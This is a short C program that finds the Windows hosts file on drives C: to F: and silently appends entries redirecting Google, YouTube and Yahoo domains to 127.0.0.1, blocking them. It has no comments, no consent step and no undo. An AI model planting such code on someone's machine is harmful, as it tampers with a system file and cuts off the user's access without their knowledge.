#include<stdio.h>
#include<dos.h>
#include<dir.h>

char site_list[6][30] = {
"google.com",
"www.google.com",
"youtube.com",
"www.youtube.com",
"yahoo.com",
"www.yahoo.com"
};

char ip[12] = "127.0.0.1";
FILE *target;

int find_root(void);
void block_site(void);

int find_root() {
	int done;
	struct ffblk ffblk;

	done = findfirst("C:\\windows\\system32\\drivers\\etc\\hosts",&ffblk,FA_DIREC);
	if (done == 0) {
		target = fopen("C:\\windows\\system32\\drivers\\etc\\hosts","r+");
		return 1;
	}

	done = findfirst("D:\\windows\\system32\\drivers\\etc\\hosts",&ffblk,FA_DIREC);
	if (done == 0) {
		target = fopen("D:\\windows\\system32\\drivers\\etc\\hosts","r+");
		return 1;
	}

	done = findfirst("E:\\windows\\system32\\drivers\\etc\\hosts",&ffblk,FA_DIREC);
	if (done == 0) {
		target = fopen("E:\\windows\\system32\\drivers\\etc\\hosts","r+");
		return 1;
	}

	done = findfirst("F:\\windows\\system32\\drivers\\etc\\hosts",&ffblk,FA_DIREC);
	if (done == 0) {
		target = fopen("F:\\windows\\system32\\drivers\\etc\\hosts","r+");
		return 1;
	}

	else return 0;
}

void block_site() {
	int i;
	fseek(target, 0, SEEK_END);
	fprintf(target, "\n");
	for (i = 0; i < 6; i++)
	fprintf(target, "%s\t%s\n", ip, site_list[i]);
	fclose(target);
}

void main() {
	int success = 0;
	success = find_root();
	if (success) block_site();
}